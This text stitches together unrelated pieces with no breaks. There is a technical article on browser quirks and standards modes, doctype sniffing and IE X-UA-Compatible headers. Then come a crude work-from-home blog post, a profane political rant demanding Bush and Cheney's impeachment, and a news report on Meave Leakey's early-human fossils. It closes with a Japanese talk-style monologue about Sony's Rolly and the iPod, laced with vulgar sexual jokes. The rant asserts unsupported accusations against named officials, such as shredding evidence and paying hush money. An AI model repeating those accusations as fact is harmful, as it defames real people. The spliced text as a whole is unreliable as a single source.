If you follow the advice given in this document , you wo n’t be targeting these modes , so the imperfections of the imitations wo n’t matter to you in production .
However , the takeaway for testing is that you ’ll be better off testing your site in actual old versions of IE running in a bunch of virtual machines than using the developer tools newer IE versions to make the new version emulate an old version for testing .
IE10 for Windows Phone 8 has all these modes , too — just like IE10 on desktop .
The old Spartan Edge based on EdgeHTML and the new Anaheim Edge based on Chromium do not have Web content - controllable IE modes and behaves like other browsers , but see below about local configuration that can make Spartan Edge launch IE11 or that can make Anaheim Edge load IE11 within Edge ’s user interface .
IE - Specific Additional Modes from Google
The following are additional modes available in IE6 , IE7 , IE8 and IE9 ( but not in IE10 on Windows 8 or on Windows 7 as of February 2013 ) when the since discontinued Google Chrome Frame has been installed .
Chrome Quirks
This mode is the same as the Quirks mode in Google Chrome .
Chrome Standards
This mode is the same as the Standards mode in Google Chrome .
Chrome Almost Standards
This mode is the same as the Almost Standards mode in Google Chrome .
Enterprise Mode and IE11 Mode
The modes discussed above are mode that Web content can choose to activate .
IE11 and Chromium - based Edge ( Anaheim ) have additional modes that are mentioned here for completeness but that are not the main focus of this article , since they cannot be controlled by Web content .
IE11 has a feature called Enterprise Mode that allows local administrative configuration to designate some sites as loaded in Enterprise Mode that can either act as IE7 or as IE8 .
These modes are claimed to match the actual IE7 and IE8 better than the IE7 and IE8 Compatibility View modes .
It 's unclear why this is so .
The claim is suggestive of Enterprise Mode loading a copy of the IE8 engine rather than the IE11 engine the with conditinal branches to activate old behaviors , but I have n't found a reliable source explaining how the Enterprise Mode and Compatibility View actually differ implementation - wise .
Chromium - based Edge ( Anaheim ) has a feature called IE mode , which allows local administrative configuration to designate some sites as loaded in IE11 or in the Enterprise Mode of IE11 .
This means that IE11 internals run within the Edge ’s user interface .
In contrast , EdgeHTML - based Edge ( Spartan ) does not run IE11 within its user interface but instead launches the actual IE11 when encountering a site that local configuration designates as requiring IE .
( This means that further navigations to other sites in IE11 do not return to using Edge . )
Non-Web Modes
Some engines had modes that are not relevant to Web content .
These modes are only mentioned here for completeness .
Presto - based Opera had a WML 2.0 mode .
WebKit on Mac OS X 10.5 had a special mode for legacy Dashboard widgets ( perhaps this mode remains in newer versions — I have not investigated ) .
WebKit also has hacks for applications that embed WebKit on Mac OS X .
The Effects
Here are the main effects of the modes :
Layout
Except in IE , the modes for text / html mainly affect CSS layout and the style system .
For example , not inheriting styles into tables is a quirk .
In old versions of IE and Opera , the box model changes to the IE 5.5 box model in the Quirks mode .
This document does not enumerate all the layout quirks .
For a list , please refer to Mozilla ’s documentation and the Quirks Mode specification .
In the Almost Standards mode ( in browsers that have one and all the current ones do ) , the height of table cells containing only images is computed differently compared to the Standards mode .
In the XML mode , selectors have different case - sensitivity behavior .
Furthermore , special rules for the HTML body element do not apply in older versions of browsers that do not implement the more recent adjustments to the CSS specifications .
Parsing
There are also some quirks that affect HTML and CSS parsing and would cause conforming pages to be misparsed .
These quirks are toggled on and off with quirky layout .
However , it is important to realize that the Quirks mode vs .
Standards mode is predominantly about CSS layout and CSS parsing — not HTML parsing .
In browsers that have an HTML5 - compliant HTML parser , there is exactly one HTML parsing quirk .
Some people misleadingly refer to the Standards mode as “ strict parsing mode ” , which is misunderstood to imply that browsers enforced HTML syntax rules and that a browser could be used to assess the correctness of markup .
This is not the case .
The browsers do tag soup fix - ups even when the Standards mode layout is in effect .
( In the summer of 2000 before Netscape 6 was released , Gecko actually had parser modes that enforced HTML syntax rules and one of these modes was called the “ Strict DTD ” .
These modes were incompatible with existing Web content and were abandoned . )
Another common misconception is related to XHTML parsing .
It is often thought using an XHTML doctype gains different parsing .
It does not .
XHTML documents served as text / html are parsed using the same parser that is used for HTML .
As far as browsers are concerned , XHTML served as text / html is just “ tag soup with croutons ” ( an extra slash here and there ) .
Only documents served using an XML content type ( e.g. application / xhtml+xml or application / xml ) trigger the XML mode for parsing in which case the parser is totally different from the HTML parser .
Scripting
Although the Quirks mode is primarily about CSS , there are some scripting quirks as well .
Until Firefox 14 , the HTML id attribute did n’t establish object references from the global scripting scope in the Standards and Almost Standards modes .
In Firefox , document . all is partially available in the Quirks mode but not in the other modes .
The effects on scripting are more dramatic in IE when falling into a mode that emulates an old version of IE .
In the XML mode , some DOM APIs behave differently , because the DOM API behavior for XML is defined to be incompatible with the HTML behavior .
With hindsight , this is quite unfortunate .
Doctype Sniffing ( aka. Doctype Switching )
Browsers use doctype sniffing in order to decide the engine mode for text / html documents .
This means that the mode is picked based on the document type declaration ( or the lack thereof ) at the beginning of an HTML document .
( This does not apply to documents served with an XML content type . )
A document type declaration ( doctype ) is a syntactic artifact of SGML — a legacy markup framework that HTML prior to HTML5 was purportedly defined in terms of .
In the HTML 4.01 specification , the document type declaration is said to communicate HTML version information .
Despite the name “ document type declaration ” and despite what the HTML 4.01 specification says about “ version information ” , the document type declaration is not an appropriate means for classifying SGML or XML documents as documents of a particular type even though it seems it was supposed to be ( hence the name ) .
( More on this in the addendum . )
Neither the HTML 4.01 specification nor ISO 8879 ( SGML ) says anything about using the document type declaration as an engine mode switch .
Doctype sniffing is based on the observation that at the time doctype sniffing was devised the vast majority of quirky documents either did n’t have a document type declaration or they referenced an old DTD .
HTML5 acknowledges this reality and defines the doctype in text / html as a mode switch only .
A typical pre-HTML5 document type declaration contains ( separated by white space ) the string “ <! DOCTYPE ” , the generic identifier of the root element ( “ html ” ) , the string “ PUBLIC ” , a public identifier of a DTD in quotes , possibly a system identifier ( an URL ) of the same DTD and the character “ > ” .
HTML5 simplies the doctype to “ <! DOCTYPE html > ” .
The document type declaration is placed in the document before the start tag of the root element .
Choosing a Doctype
text / html
Here are simple guidelines for choosing a doctype for a new text / html document : Standards mode , cutting edge validation <! DOCTYPE html >
This is what you should use .
With this doctype , you can validate new features such as < video > , < canvas > and ARIA .
Please be sure to test your page in the latest versions of the top browsers .
Standards mode , legacy validation target <! DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN " " http://www.w3.org/TR/html4/strict.dtd " >
This doctype also triggers the Standards mode , but lets you stick to less precise legacy validation that does n’t know about new features in case your organization has silly policies that require targeting legacy validation .
But you really should be using <! DOCTYPE html > and get the policies of your organization revised .
You ’d like to use the Standards mode , but you use sliced images in table layouts and do n’t want to fix them <!
DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional //EN " " http://www.w3.org/TR/html4/loose.dtd " >
This gives you the Almost Standards mode .
Please note that your layouts based on sliced images in tables are likely to break if you later move to HTML5 ( and , hence , the full Standards mode ) , so it ’s better to make your designs Standards mode - compatible right now .
You willfully want the Quirks mode No doctype .
Please do n’t do this .
Willfully designing for the Quirks mode will come and haunt you , your coworkers or your successors in the future .
If you frustrated by the differences between old IE versions and still need to support them due to client requirements , it is better to apply specific hacks for legacy versions using conditional comments than seek commonality in the Quirks mode .
I am not recommending any of the XHTML doctypes , because serving XHTML as text / html is considered harmful .
If you choose to use an XHTML doctype anyway , please note that the XML declaration makes IE 6 ( but not IE 7 ! ) trigger the Quirks mode .
application / xhtml+xml
The simple guideline for application / xhtml+xml is not to use a doctype at all .
This way the page cannot be “ strictly conforming ” XHTML 1.0 , but that does not matter .
( Please see the Addendum below . )
IE8 , IE9 , IE10 , and IE11 Complications
It was announced on A List Apart that IE8 would use a meta element - based mode switch in addition to doctype being a factor in the mode choice .
( See commentary by Ian Hickson , David Baron , David Baron again , Robert O’Callahan and Maciej Stachowiak . )
IE8 has four modes : IE 5.5 quirks mode , IE 7 standards mode , IE 8 almost standards mode and IE 8 standards mode .
IE9 has seven modes : IE 5.5 quirks mode , IE 7 standards mode , IE 8 almost standards mode , IE 8 standards mode , IE 9 almost standards mode , IE 9 standards mode and IE 9 XML mode .
IE10 has eleven modes : IE 5.5 quirks mode , IE 7 standards mode , IE 8 almost standards mode , IE 8 standards mode , IE 9 almost standards mode , IE 9 standards mode , IE 9 XML mode , IE 10 quirks mode , IE 10 almost standards mode , IE 10 standards mode and IE 10 XML mode .
The choice of mode depends on data from various sources : doctype , a meta element , an HTTP header , periodically downloaded data from Microsoft , the intranet zone , settings made by the user , settings made by an intranet administrator , the mode of the frame parent if any and a UI button togglable by the user .
( With other apps that embed the engine , the mode also depends on the embedding application . )
The lucky thing is that IE8 and IE9 use doctype sniffing roughly like other browsers and IE10 uses doctype sniffing exactly like other browsers if all the following points are true :
There is no X - UA - Compatible HTTP header set by the author .
HTTP header set by the author .
There is no X - UA - Compatible meta tag set by the author .
tag set by the author .
Microsoft has not placed the domain name of the site on the list of exceptions .
of the site on the list of exceptions .
An intranet admin has not placed the site on the list of exceptions .
The user has not pressed the Compatibility View button ( or otherwise added the domain to a user - specific list of exceptions ) .
( Metro IE10 does not have this UI , but the UI in desktop IE10 affects the behavior in the Metro mode also . )
The site is not in the intranet zone .
The user has not chosen to display all sites as in IE7 .
The page is not framed by a Compatibility Mode page .
For the points other than the two X - UA - Compatible cases , IE8 and IE9 perform doctype sniffing like IE7 .
The IE7 emulation is called Compatibility View .
In the X - UA - Compatible cases , IE8 and IE9 behave radically differently from other browsers .
For the behavior of IE8 , please see an appendix on this page or a flowchart available in PDF and PNG formats .
( Contrast with the chart for other browsers as PDF . )
There is also a unified chart of IE 5.5 through 9 ( potentially with Chrome Frame ) modes as PDF .
Unfortunately , without an X - UA - Compatible HTTP header or meta tag , IE8 and IE9 let the user accidentally drop your page from their most standards mode to the IE7 mode that emulates the standards mode of IE7 even if you used a proper doctype .
Worse , an intranet admin may do this .
Also , Microsoft may have put the entire domain you use ( e.g. mit.edu ! ) on the list of exceptions .
To counter these effects , a doctype is n’t enough and you need an X - UA - Compatible HTTP header or meta tag .
Here are simple guidelines for choosing an X - UA - Compatible HTTP header or meta tag for a new text / html document that already has a doctype that triggers the standards mode or almost standards mode in other browsers :
Your domain is not on Microsoft ’s list of exceptions and you care more about not having to have browser - specific cruft than about making sure users can’t regress the rendering to IE7 behavior
You do n’t need to include an X - UA - Compatible HTTP header or meta tag .
Your domain is on Microsoft ’s list of exceptions , your domain ( like iki.fi ! ) has other authors whose broken sites may induce users to enable Compatibility View for the whole domain , you are concerned about other sites framing your site ( in versions of IE that allowed different modes for the framer and the framee ) or you want to make sure users cannot enable the Compatibility View Include either the following meta element on your page < meta http - equiv= " X - UA - Compatible " content = " IE=Edge " > ( before any script elements ! ) or set the following HTTP header on your page : X - UA - Compatible : IE=Edge
Your site worked in IE7 but breaks in IE8 or IE9 First , include either the following meta element ( which in invalid in HTML5 ) on your page < meta http - equiv= " X - UA - Compatible " content = " IE=EmulateIE7 " > ( before any script elements ! ) or set the following HTTP header on your page : X - UA - Compatible : IE=EmulateIE7
Then fix your site not to rely on non-standard IE7 behaviors and migrate to IE= Edge .
Your site worked in IE8 but breaks in IE9 First , include either the following meta element ( which in invalid in HTML5 ) on your page < meta http - equiv= " X - UA - Compatible " content = " IE=EmulateIE8 " > ( before any script elements ! ) or set the following HTTP header on your page : X - UA - Compatible : IE=EmulateIE8
Then fix your site not to rely on non-standard IE8 behaviors and migrate to IE= Edge .
Your site worked in IE9 but breaks in IE10 First , include either the following meta element ( which in invalid in HTML5 ) on your page < meta http - equiv= " X - UA - Compatible " content = " IE=EmulateIE9 " > ( before any script elements ! ) or set the following HTTP header on your page : X - UA - Compatible : IE=EmulateIE9
Then fix your site not to rely on non-standard IE8 behaviors and migrate to IE= Edge .
Google Chrome Frame Complications
Google Chrome Frame is a combination of a browser extension and browser plug - in for IE 6 , 7 , 8 and 9 that adds the engine of Google Chrome into the user interface shell of IE using the networking stack that IE uses .
After installation , IE behaves normally by default .
However , Web pages can opt to invoke the engine of Chrome instead of the engine of IE using an X - UA - Compatible HTTP header or meta tag .
Specifying chrome=1 in X - UA - Compatible invokes Chrome Frame in any supported version of IE if Chrome Frame is installed .
Specifying chrome=IE6 activates Chrome Frame in IE6 only , specifying chrome=IE7 activates Chrome Frame only in IE7 and IE6 , and chrome=IE8 activates Chrome Frame only in IE8 and lower .
The directive for activating Chrome Frame can be combined with the directives for controlling the engine of IE ( in case Chrome Frame is not installed ) by separating them with a comma or a semicolon : < meta http - equiv= " X - UA - Compatible " content = " IE=Edge , chrome=IE8 " > .
Once the Chrome Frame has been activated for a page , one of the four modes ( Standards , Almost Standards , Quirks and XML ) of Chrome is chosen as in normal Chrome .
Google Chrome Frame was discontinued years ago .
You should not try to accommodate it .
It is mentioned here only for historical completeness .
Addendum : A Plea to Implementors and Spec Writers Working with XML
Please do n’t bring doctype sniffing to XML .
Doctype sniffing is a tag soup solution to a tag soup problem .
Doctype sniffing was devised after the HTML 4 and CSS2 specs had been written as a heuristic way to distinguish legacy documents from documents whose authors might expect conforming behavior .
Sometimes it is suggested that doctype sniffing be used on the XML side as well for dispatching to different handlers , for recognizing the vocabulary in use , or for activating features .
This is a bad idea .
Dispatching and vocabulary recognition should be based on namespaces and feature activation should be based on explicit processing instructions or elements .
The whole concept of well - formedness was introduced to allow DTDless parsing of XML and , by extension , doctypeless documents .
In formal terms , if two XML documents have the same canonical form and an app treats them differently ( and the difference is not due to opting not to process external entities ) , chances are the app is broken .
In practical terms , if two XML documents cause the same content to be reported ( qnames ignored ) to SAX2 ContentHandler and an app treats the documents differently , chances are the app is broken .
Considering that as a Web author you cannot trust that everyone parsing your pages uses an XML processor that resolves external entities ( even if some browsers appear to do so because they map certain public ids to an abridged DTD for entity definitions ) , inserting a doctype in XML intended for the Web is mostly pointless and often done out of a cargo cultish habit .
( You can still validate against a DTD using the DTD override feature of the W3C Validator , although the W3C Validator will say that the result is only tentatively valid .
Or better yet , you can use RELAX NG validation , which does not pollute the document with schema references . )
Requiring a doctype only for sniffing would be silly , even though that is the situation with HTML in practice .
Moreover , when a lower - level spec defines two things that are equivalent , a higher - level spec should not try to give different meanings to the two things .
Consider <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN " " http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd " > .
If the public identifier is removed , the same DTD is still designated and , therefore , the doctype <!DOCTYPE html SYSTEM " http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd " > means the same as the previous doctype .
Should they be sniffed differently ?
The idea can be carried further .
Suppose the DTD is copied to example.com and named foobar.dtd : <! DOCTYPE html SYSTEM " http://example.com/foobar.dtd " > .
How could that one be sniffed ?
The meaning is the same .
The whole DTD could even be pasted inline !
To put it another way , if you have #include " foo.h " , you should not bind any black magic to the name foo.h , because it should be permissible to paste the contents of foo.h inline or copy the contents of foo.h to bar.h and say #include " bar.h " .
The reason I do n’t bother making the same argument with HTML and SGML is that Web browsers do n’t use real SGML parsers for parsing HTML , so I do n’t think it is useful to pretend that SGML is being dealt with .
However , if you are not convinced yet , please see W. Eliot Kimber ’s comp.text.sgml post about the matter ( link blocked by Google as of January 2020 ) .
Note : IE10 and IE11 have a processing instruction for requesting IE9 behavior in IE10 and IE11 or IE10 behavior in IE11 for XML .
Appendix : Handling of Some Doctypes in text / html
In the following table , Quirks Mode , Standards Mode and Almost Standards Mode are denoted by Q , S and A , respectively .
When a browser only has two modes , the Standards Mode is marked as “ S ” , if the line height in table cells works as in Mozilla ’s Standards Mode , and as “ A ” , if the line height in table cells works as in Mozilla ’s Almost Standards Mode .
Please note that XHTML served using an XML content type is rendered in the XML mode .
The purpose of this table is not to suggest that all the doctypes listed in the table are reasonable choices for new pages .
The purpose of this table is to show what data I am basing my recommendations on .
The following shorthand notation is used in the column headers :
NS6 Mozilla 0.6…0.9.4 and Netscape 6.0…6.2.3 Old Moz Mozilla 0.9.5 through 1.1 alpha and Mozilla 1.0 Moz & Safari & Chrome & Edge & Opera 10 & IE10 & IE11 & HTML5 Mozilla 1.0.1 , Mozilla 1.1 beta and later , Firefox , Netscape 7 and later , Safari 0.9 and later , Opera 10 and later , Chrome , Edge , Konqueror 3.5 , IE10 , IE11 , the HTML5 specified behavior ( IE10 and IE11 Quirks means the interoperable Quirks mode rather than the IE 5.5 mode ) Opera 9.0 Opera 9.0…9.20 IE 8 , IE 9 & Opera 9.5 IE 8 or IE 9 by default when there is no X - UA - Compatible override nor a Compatibility View override ( “ A ” means the IE8 Almost Standards mode for IE8 and IE9 Almost Standards mode for IE9 ) , Opera 7.5… 8.54 and 9.5…9.6 IE 7 & Opera 7.10 Windows IE 7 , IE 8 with Compatibility View enabled but without X - UA - Compatible override ( in this case “ A ” means the IE7 mode ) and Opera 7.10 … 7.23 IE 6 & Opera 7.0 Windows IE 6 and Opera 7.0… 7.03 Mac IE 5 Mac IE 5.0… 5.2.3 Konq 3.2 Konqueror 3.2.2…3.3 ( possibly also 3.1…3.2.1 ; I have not been able to confirm )
Historical Notes
Mozilla ’s doctype sniffing code has changed substantially in October 2000 , in September 2001 and in June 2002 .
This document describes the situation with Mozilla builds made available at ftp.mozilla.org on 2000 - 10 - 19 and later ( and with Netscape 6.x ) .
This document does not address the way doctype sniffing worked in Mozilla M18 ( and Netscape 6.0 PR3 ) .
Safari ’s doctype sniffing code has also changed substantially since the first public beta .
This document does not cover the behavior of versions earlier than v73 aka .
0.9 .
Konqueror ’s doctype sniffing code prior to version 3.5 appears to come from a very early version of Safari .
Konqueror now matches Safari whose doctype sniffing code comes from Mozilla .
As can be seen from the table , Opera ’s doctype sniffing has gradually moved from being IE - like to towards being Mozilla - like , although Opera 9.5 and 9.6 regressed on the way .
At the same time , the layout behavior of Opera ’s Quirks mode has shifted from imitating the Quirks mode of IE 6 towards the Quirks mode of Mozilla .

Successfully working from home requires balance , motivation , leaving the house , and separating work from personal life .
Enjoy the benefits of working from home :
Not having to commute , not having to interact with the Dwight Shrudes of the world , being able to focus on work when you want , " Judge Judy is on right now , I think I will take a break " .
Developing your own schedule , I mean the boss is not over your shoulder and if you need to go for a run , walk the dog , or get away from the desk then go do your thing .
One of my favorite parts of my work week from home was the weekly hour long conference calls with my co-workers .
I usually spent this time on my laptop with the cell phone on mute , sitting on my deck , by the pool , while barbequing chicken kabobs on the Weber , and having an ice cold Corona .
What sucks ( for me ) about working from home was when to turn the damn computer off which was partly my employer and partly my doing getting too involved in projects and realizing that I have been sitting in front of the computer for 13 hours and forgot to take a shower , sitting in the same thing I slept in the night before , bed head , butt stuck to the chair .
Also , not leaving the house for weeks at a time - Why leave ?
My kitchen is stocked with food , I recently moved to a new State and did not know anyone , no kids to take to school or anything , and everything is here in my house .
I realized not leaving the house was a problem when I tried cutting my hand and making a hand print on a soccer ball shaped like a man 's face to have a little interaction with someone .
The one guy I met who had the ultimate work at home job was this guy in Las Vegas I did some web design work for and he had amateur adult sites where he did the entire filming , photo taking , and web site work from his house .
He had random 18 - 30 year old girls over everyday who he would take pictures of and do his thing with on his video camera , and that was truly the best work at home job I have ever seen , but this goes into a whole new topic of balancing your time spent working form home with time spent at the clinic for checkups .
Also , watch were you sit when you visit his house , " Hey Buddy wait a minute , did n't I just see this mug I am drinking out of used as a prop in that last video I saw " .
Now , I work fulltime in an in - house position again .
The commute definitely sucks with gas prices going up and idiots who still do not know how to drive .
But , for me personally , I like being forced out of the house daily , and interacting with my co-workers .
Just the early shower and dressing up for work , stopping by the gym on the way home has actually been really good for me .
I think I did the work from home thing too long and kind of burned out the whole fun factor .
I would n't mind working from home full - time again ; I know that if the option came up again I could consider doing it .
For me , it seemed like life was kind of passing me by and I was missing out in something .
Even if what I was missing was just driving and flipping off the guy who cut me off on the freeway on the way home .
Also , there is nothing like flirting with the hot secretary in the office , or BS - ing around the water cooler about American Idol .
It 's 1:00 pm right now and I am sitting at my desk typing this , and makes me think about the chicken kabobs and ice cold Corona ….ah those were the good ole days .
Rep. John Conyers , chairman of the House Judiciary Committee , says that impeachment is not off the table .
That 's a nice sound - bite , Congressman , almost as nice as Sen.
Larry Craig 's insistence that he has never had sex with a man .
We all know it 's a crock , and Conyers and Craig both know it when they say it , but it sounds good .
Impeachment is so far off the table it may as well be at another restaurant .
As a tool for the removal of the cancer on the executive branch , impeachment is no longer operational , as they say .
We 've simply run out of time , because people like Conyers , Speaker Nancy Pelosi and Senate Majority Leader Harry Reid have been too scared to use their Constitutional powers for the good of the nation .
They prefer to SOUND like they 're serious about it , as per Conyers ' insistence at a town hall meeting in Michigan this week .
They have no intention of actually walking the walk , but they need to keep talking the talk , even as they continue to fund Bush 's illegal war .
Even if the will to impeach were there , it would still take Congress a year to clear its collective throat , parade all 535 of its bullshit artists in front of town halls and Sunday morning blowhard shows , so that they can be seen looking suitably serious .
And who could bear that parade of pomposity ?
Certainly not the people .
So , it 's best to keep talking the talk and hope they do n't rise up and storm the Winter Palace .
To use a basketball metaphor , Conyers , Pelosi and Reid have decided to just ride out the clock on Bush and Cheney , to sit on their lead .
But , as Al McGuire used to say , " Two minutes is an eternity in basketball . "
Likewise , fifteen more months of Bush and Cheney is an eternity for the country and the planet .
But Congress prefers to do nothing but talk .
Talk is cheap , and talk in DC is cheaper than the perfume in Sen.
David Vitter 's favorite Washington cat house or the urine - speckled toilet paper on the floor of Sen.
Craig 's favorite sex stall .
The bottom line :
If impeachment is not used now , for this administration , then it should never be used again .
Ever .
It should simply be deleted from the Constitution , or placed inside a glass exhibit case at the National Archives for the tourists , maybe next to the photograph of Dick Nixon shaking hands with a drug - addled Elvis Presley .
No president and vice president have committed more and worse high crimes and misdemeanors than George W. Bush and Richard Cheney .
And yet , no president or vice president have faced less accountability .
Slowly , the accomplices in crime â€ ” Rumsfeld , Miers , Rove , Gonzalez â€ ” scuttle off to cushy private sector posts .
But the crimes remain unpunished and witnesses ' memories are getting hazier by the day .
You can also bet the mortgage that behind doors all over Washington , interns and party hacks are shredding documents , destroying evidence , paying hush money to the little scummy minions who propped up this charade .
Reid , Pelosi , Conyers , et al , made nice - sounding statements after Attorney General Alberto Gonzalez departed â€ ” " the investigations will continue " â€ ” but it 's all for show .
They have no intention of holding Bush or Cheney accountable .
Cheney will die of old age before a single subpoena is issued and Bush will be safely ensconced on some Paraguayan ranch by the time they get around to issuing polite pleas for his extradition .
History will judge this Congress , and the previous two Congresses , harshly for their spinelessness and inaction .
Even if it goes " overtime , " and runs into the next terms of office , impeachment must happen , as an act of national reconciliation .
Quit talking and start walking .
_______
WASHINGTON — Surprising research based on two African fossils suggests our family tree is more like a wayward bush with stubby branches , challenging what had been common thinking on how early humans evolved .
The discovery by Meave Leakey , a member of a famous family of paleontologists , shows that two species of early human ancestors lived at the same time in Kenya .
That pokes holes in the chief theory of man ’s early evolution : that one of those species evolved from the other .
And it further discredits that iconic illustration of human evolution that begins with a knuckle - dragging ape and ends with a briefcase - carrying man .
The old theory is that the first and oldest species in our family tree , Homo habilis , evolved into Homo erectus , which then became human , Homo sapiens .
But Leakey ’s find suggests those two earlier species lived side - by - side about 1.5 million years ago in parts of Kenya for at least half a million years .
She and her research colleagues report the discovery in a paper published in Thursday ’s journal Nature ( www.nature.com).
The paper is based on fossilized bones found in 2000 .
The complete skull of Homo erectus was found within walking distance of an upper jaw of Homo habilis , and both dated from the same general time period .
That makes it unlikely that Homo erectus evolved from Homo habilis , researchers said .
It ’s the equivalent of finding that your grandmother and great - grandmother were sisters rather than mother and daughter , said study co-author Fred Spoor , a professor of evolutionary anatomy at the University College in London .
The two species lived near each other , but probably did n’t interact , each having its own “ ecological niche , ” Spoor said .
Homo habilis was likely more vegetarian while Homo erectus ate some meat , he said .
Like chimps and apes , “ they ’d just avoid each other , they do n’t feel comfortable in each other ’s company , ” he said .
There remains some still - undiscovered common ancestor that probably lived two million to three million years ago , a time that has not left much fossil record , Spoor said .
Overall what it paints for human evolution is a “ chaotic kind of looking evolutionary tree rather than this heroic march that you see with the cartoons of an early ancestor evolving into some intermediate and eventually unto us , ” Spoor said in a phone interview from a field office of the Koobi Fora Research Project in northern Kenya .
That old evolutionary cartoon , while popular with the general public , is just too simple and keeps getting revised , said Bill Kimbel , who praised the latest findings .
He is science director of the Institute of Human Origins at Arizona State University and was n’t part of the Leakey team .
“ The more we know , the more complex the story gets , ” he said .
Scientists used to think Homo sapiens evolved from Neanderthals , he said .
But now we know that both species lived during the same time period and that we did not come from Neanderthals .
Now a similar discovery applies further back in time .
Susan Anton , a New York University anthropologist and co-author of the Leakey work , said she expects anti-evolution proponents to seize on the new research , but said it would be a mistake to try to use the new work to show flaws in evolution theory .
“ This is not questioning the idea at all of evolution ; it is refining some of the specific points , ” Anton said .
“ This is a great example of what science does and religion does n’t do .
It ’s a continous self - testing process . ”
For the past few years there has been growing doubt and debate about whether Homo habilis evolved into Homo erectus .
One of the major proponents of the more linear , or ladder - like evolution that this evidence weakens , called Leakey ’s findings important , but he was n’t ready to concede defeat .
Dr. Bernard Wood , a surgeon - turned - professor of human origins at George Washington University , said in an e-mail Wednesday that ``this is only a skirmish in the protracted `war ’ between the people who like a bushy interpretation and those who like a more ladder - like interpretation of early human evolution . ”
Leakey ’s team spent seven years analyzing the fossils before announcing it was time to redraw the family tree and rethink ideas about human evolutionary history .
That ’s especially true of most immediate ancestor , Homo erectus .
Because the Homo erectus skull Leakey recovered was much smaller than others , scientists had to first prove that it was erectus and not another species nor a genetic freak .
The jaw , probably from an 18 - or 19 - year - old female , was adult and showed no signs of malformation or genetic mutations , Spoor said .
The scientists also know it is n’t Homo habilis from several distinct features on the jaw .
That caused researchers to re-examine the 30 other erectus skulls they have and the dozens of partial fossils .
They realized that the females of that species are much smaller than the males : something different from modern man , but similar to other animals , said Anton .
Scientists had n’t looked carefully enough before to see that there was a distinct difference in males and females .
Difference in size between males and females seem to be related to monogamy , the researchers said .
Primates that have same - sized males and females , such as gibbons , tend to be more monogamous .
Species that are not monogamous , such as gorillas and baboons , have much bigger males .
This suggests that our ancestor Homo erectus reproduced with multiple partners .
The Homo habilis jaw was dated at 1.44 million years ago .
That is the youngest ever found from a species that scientists originally figured died off somewhere between 1.7 and 2 million years ago , Spoor said .
It enabled scientists to say that Homo erectus and Homo habilis lived at the same time .

今週気づいたこと 。
「ソニーが、ソニーが・・・時代の１００歩先を行ってしまって、見失った。俺は。」
<< タイトルコール >>
Rolly見た・・・？
あのー、ソニーが、ひと月まで前じゃないか？何週間か前にソニーのホームページに、「Rollyっていうすげえの作ったからお前ら覚悟しろよ！」っつって、ね？アレなんつうのかな、何広告っていうのかな。いわゆる広告業界ではああいうやり方あると思うんですけど、「すごいの出る」っつって、そのフォルムみたいのを見せないわけ。
だから、ホームページには、「ソニーが音楽関連の新しい機械ですごいのを出す」っつってモザイクになってたから、俺は相当すごいのが、「すんげえ機能満載でモザイクなしでみせちゃうと他所に真似されちゃうのが嫌」なのか、「完全に女性器の形をしているか」のどっちかだと思ってたわけ。そういう機械が出るんだと思って期待してた訳です。まあ女性器の方を。
あんま見たことないんで。見たい！と思って。
んで、その後にちょっとソニーが不幸だったなと思うのが、「iPodキラーだ」って話が出たんだよね。ものすごい勢いで。これはついにソニーが、一番得意だった携帯音楽プレーヤーっていう、ウォークマンというジャンルはソニーが作ったわけで、それがどんどん進化して今のシリコンオーディオになってる中で、ね？
あれ、俺なんかかっこいいこと言ってね？DIMEに連載持てそうな感じの？でも連載の話が来たときには女性器そっくりの所しか、女性器そっくりのプレーヤー出ねえかな、ってので埋め尽くしてやりますけど。
ま、ソニーからしてみたら、iPodが世界を席巻してるのは、ソニーが作った「音楽を持ち歩こう」、「音楽を聴きながら仕事をしよう、町を行こう」みたいな、お家芸の部分を。それを、ずーっとこうアップルコンピュータにでかい顔をされてると。苦渋を、辛酸を舐めさせられてきた。そこでついにソニーがiPodを打ち負かせるようなものを出すんじゃないか、まあソニーは出すとは言ってないんだけどね、やっぱみんなソニーを期待してんだよね。
実際iPodで出遅れたけども、その後ソニーが作ってきたメモリーオーディオのやつ、メモリーウォークマンて名前なのかな？あれ。結構ソニーも追いついてきて、電池の保ちとかはソニーの方が全然抜いてない？とか、それから大きさ小さいのにビデオも表示できて、さらにはiPodのメモリー版が8GB出してきたらすぐにソニーが（容量で）追いついて、しかも再生時間がすごい長いとか、かなり追いついてきた感があるところに、ついにシークレット広告を出したから。
これ多分だけど、アップルコンピュータ(原文ママ)もびびったと思うんだよね。ていうのも今CMばんばん打ってるけど、アップルもiPodのラインアップを変えたんだよね。で、今まであったiPod nanoを形変えて、今まではビデオは再生できなかったんだけど、再生できるようにしたりとか。さらに、「あせったんだな」と思ったのが、Appleって基本的に「こういう画期的な商品が出ます」って言った日から買えるっていう、
今ま でAppleの親方が 「おう、これだ馬鹿野郎、びっくりして座り小便して馬鹿んなっても知らねえぞこの野郎」っつって、「おう、みんな派手に餅を撒け、そういうとこケチるとゲンが悪いんだよお前よォ」っつって「建前じゃ建前じゃ！」っつってさあ、びっくりするぐらいババアしか食わねえような飴をガキにバンバン投げつけたりしてさ、「最後は三本締めで」なんつって最後は不審火で現場燃えちゃってっていう、そのずっこけ頭領の、あれ？おれ頭領の話してないよな？
そう、アップルコンピュータは発表があると、その直後からインターネットのAppleストアで買い物ができるわけ。今回も新型のiPod nanoに関してはすぐに注文受付になったんだけど、iPod touchっつったかな。アメリカで売ってるiPhoneの電話はつかないんだけど、ビデオは再生できるわ、今までの倍の容量あるわ、みたいなバージョンは発表したけど一ヶ月後の発売なのね。9/28ごろ出荷みたいな。今までのアップルは割とそういうやり方しかしなかったのに前倒しで発表したっていうのは、俺はRollyが怖かったんじゃないかと勘ぐっちゃうわけ。
